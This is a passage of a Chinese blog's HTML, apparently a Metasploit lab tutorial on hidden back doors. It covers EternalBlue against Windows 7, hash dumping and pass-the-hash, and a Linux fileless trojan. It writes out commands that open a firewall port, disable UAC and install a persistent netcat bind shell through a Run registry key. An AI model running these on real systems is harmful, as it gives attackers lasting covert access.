-<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104745057.png" alt="image-20210820104745057"></p>
-<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104827922.png" alt="image-20210820104827922"></p>
-<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104924609.png" alt="image-20210820104924609"></p>
-<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820105003558.png" alt="image-20210820105003558"></p>
-<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908105946439.png" alt="image-20210908105946439"></p>
-<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820105313524.png" alt="image-20210820105313524"></p>
-<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820105655498.png" alt="image-20210820105655498"></p>
-<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20211008095108236.png" alt="image-20211008095108236"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="北极星上的稻草人">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="北极星上的稻草人">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/" class="post-title-link" itemprop="url">Mestasploit渗透测试之制作隐藏back door</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-08-19 20:54:06" itemprop="dateCreated datePublished" datetime="2021-08-19T20:54:06+08:00">2021-08-19</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-10-08 10:58:37" itemprop="dateModified" datetime="2021-10-08T10:58:37+08:00">2021-10-08</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Mestasploit渗透测试之制作隐藏back-door"><a href="#Mestasploit渗透测试之制作隐藏back-door" class="headerlink" title="Mestasploit渗透测试之制作隐藏back door"></a>Mestasploit渗透测试之制作隐藏back door</h1><h2 id="一、隐藏back-door的意义"><a href="#一、隐藏back-door的意义" class="headerlink" title="一、隐藏back door的意义"></a>一、隐藏back door的意义</h2><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819101229168.png" alt="image-20210819101229168"></p>
-<h2 id="二、使用msf17-010永恒之蓝漏洞对win7进行渗透"><a href="#二、使用msf17-010永恒之蓝漏洞对win7进行渗透" class="headerlink" title="二、使用msf17-010永恒之蓝漏洞对win7进行渗透"></a>二、使用msf17-010永恒之蓝漏洞对win7进行渗透</h2><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819102221708.png" alt="image-20210819102221708"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819102252809.png" alt="image-20210819102252809"></p>
-<p><strong>win7环境</strong></p>
-<p>防火墙可以打开（使用家庭/工作网络）</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819102146715.png" alt="image-20210819102146715"></p>
-<p><strong>步骤1：</strong>渗透</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105253580.png" alt="image-20210819105253580"></p>
-<p>加载、配置、启动模块</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105337567.png" alt="image-20210819105337567"></p>
-<p>渗透成功</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105421575.png" alt="image-20210819105421575"></p>
-<p><strong>步骤2：</strong>创建一个新用户远程连接win7桌面</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105618584.png" alt="image-20210819105618584"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105650319.png" alt="image-20210819105650319"></p>
-<p>启动远程桌面</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105837404.png" alt="image-20210819105837404"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105910331.png" alt="image-20210819105910331"></p>
-<p>输入密码后，若对方正在登录则会提升如下图。（对方也会有对应的提升，如果对方30s/一段时间没操作就会默认允许）</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105942245.png" alt="image-20210819105942245"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819110057886.png" alt="image-20210819110057886"></p>
-<p><strong>步骤3：</strong>关闭主机防护策略并开启back door</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819110454539.png" alt="image-20210819110454539"></p>
-<p>这利用SAM，红色字段就是用哈斯算法加密的账号密码，前面是账号</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819110728859.png" alt="image-20210819110728859"></p>
-<p>补充：kali（linux系统）进入window的shell后会有乱码，可以输入输入 chcp 65001</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819110958691.png" alt="image-20210819110958691"></p>
-<p>指令：netsh firewall add portopening TCP 4444 “xuegod” ENABLE ALL</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111013939.png" alt="image-20210819111013939"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111056435.png" alt="image-20210819111056435"></p>
-<p>指令：cmd.exe/k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111130454.png" alt="image-20210819111130454"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111235180.png" alt="image-20210819111235180"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111252073.png" alt="image-20210819111252073"></p>
-<p>退出shell：Ctrl+c</p>
-<p>指令：cmd.exe/k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v  LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</p>
-<p><strong>步骤3：</strong>使用密码hash值登录系统</p>
-<p>说明：1.红色字段是步骤2用hashdump查看到xuegod的密码哈斯值</p>
-<p>2.SMBDomain值来自win7的工作组，如下图</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111937637.png" alt="image-20210819111937637"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111520715.png" alt="image-20210819111520715"></p>
-<p>补充：如果失败了，多尝试几次（即使配置都正确，也不会100%成功）</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112119208.png" alt="image-20210819112119208"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112142192.png" alt="image-20210819112142192"></p>
-<p>说明：C:\windows\system32只是存放路径，可以放得隐藏些，但要记住（后面还要用）</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112827492.png" alt="image-20210819112827492"></p>
-<p>指令：reg setval -k HKLM\software\microsoft\windows\currentversion\run -v lltest_nc -d ‘C:\windows\nc.exe -Ldp 443 -e cmd.exe’</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112348784.png" alt="image-20210819112348784"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112412948.png" alt="image-20210819112412948"></p>
-<p>也可以这样重启</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113147179.png" alt="image-20210819113147179"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113008314.png" alt="image-20210819113008314"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113051369.png" alt="image-20210819113051369"> </p>
-<p>登录后程序才会运行，防火墙会弹出提示</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113307966.png" alt="image-20210819113307966"></p>
-<p>程序已经在win7后台进行在监听</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113701382.png" alt="image-20210819113701382"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113549553.png" alt="image-20210819113549553"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113756461.png" alt="image-20210819113756461"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113805371.png" alt="image-20210819113805371"></p>
-<h2 id="三、Linux无文件木马程序"><a href="#三、Linux无文件木马程序" class="headerlink" title="三、Linux无文件木马程序"></a>三、Linux无文件木马程序</h2><p><strong>环境</strong></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819155530456.png" alt="image-20210819155530456"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160114518.png" alt="image-20210819160114518"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160212702.png" alt="image-20210819160212702"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160235373.png" alt="image-20210819160235373"></p>
-<p><strong>步骤1</strong>：监听</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160459633.png" alt="image-20210819160459633"></p>
-<p>渗透</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160606476.png" alt="image-20210819160606476"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160633596.png" alt="image-20210819160633596"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160805424.png" alt="image-20210819160805424"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160847284.png" alt="image-20210819160847284"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160858685.png" alt="image-20210819160858685"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160951858.png" alt="image-20210819160951858"></p>
-<p>渗透成功</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161050688.png" alt="image-20210819161050688"></p>
-<p><strong>步骤2：</strong>到centos操作系统下载执行文件来建立session</p>
-<p>（为了模拟实战隐藏行为效果，通过session进行操作）</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161335768.png" alt="image-20210819161335768"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161825848.png" alt="image-20210819161825848"></p>
-<p>补充：</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161537170.png" alt="image-20210819161537170"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161548062.png" alt="image-20210819161548062"></p>
-<p>直接输入程序地址来执行</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161706964.png" alt="image-20210819161706964"></p>
-<p>查看程序地址</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161734385.png" alt="image-20210819161734385"></p>
-<p><strong>步骤3</strong>：创建无文件back door程序</p>
-<p>配置监听4444端口（要新开个终端窗口）</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819162015597.png" alt="image-20210819162015597"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819162602534.png" alt="image-20210819162602534"></p>
-<p>（靶机终端效果展示）</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819162708421.png" alt="image-20210819162708421"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819162825798.png" alt="image-20210819162825798"></p>
-<p>说明：我们的木马文件必须放在vegile文件下</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163137866.png" alt="image-20210819163137866"></p>
-<p>（靶机终端效果展示）</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163209475.png" alt="image-20210819163209475"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163318186.png" alt="image-20210819163318186"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163454991.png" alt="image-20210819163454991"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163629607.png" alt="image-20210819163629607"></p>
-<p>效果</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163806587.png" alt="image-20210819163806587"></p>
-<p>补充：由于我们远程控制靶机下载了2个恶意文件，很容易暴露</p>
-<p>我们可以删除2个文件，其还可以监听到</p>
-<p>靶机端删除</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164122924.png" alt="image-20210819164122924"></p>
-<p>攻击者端</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164347771.png" alt="image-20210819164347771"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164453141.png" alt="image-20210819164453141"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164501638.png" alt="image-20210819164501638"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164529645.png" alt="image-20210819164529645"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819201847720.png" alt="image-20210819201847720"></p>
-<h2 id="四、使用脚本进行自动创建back-door"><a href="#四、使用脚本进行自动创建back-door" class="headerlink" title="四、使用脚本进行自动创建back door"></a>四、使用脚本进行自动创建back door</h2><p><strong>步骤1：</strong>配置脚本程序：</p>
-<p>​    注意要如图所视目录操作；因为后面的下载路径是根据这里来的。（当然也可以该，要是要注意下载路径）</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202050680.png" alt="image-20210819202050680"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202616448.png" alt="image-20210819202616448"></p>
-<p>步骤2：渗透</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202658813.png" alt="image-20210819202658813"></p>
-<p>（监听与上面实战例子的渗透模块一样，所以这里就不写操作了）</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202433617.png" alt="image-20210819202433617"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202832845.png" alt="image-20210819202832845"></p>
-<p>靶机执行脚本（这里只是为了展示，应该是有kali里执行比较好）</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203051765.png" alt="image-20210819203051765"></p>
-<p>kali查看监听结果</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203151702.png" alt="image-20210819203151702"></p>
-<p>进入会话后</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203304121.png" alt="image-20210819203304121"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203339202.png" alt="image-20210819203339202"></p>
-<p><strong>步骤3：</strong>让脚本自动运行</p>
-<p>方法1：配置开机自启动</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203504865.png" alt="image-20210819203504865"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203920988.png" alt="image-20210819203920988"></p>
-<p>方法2：配置系统级别的计划任务</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204117351.png" alt="image-20210819204117351"></p>
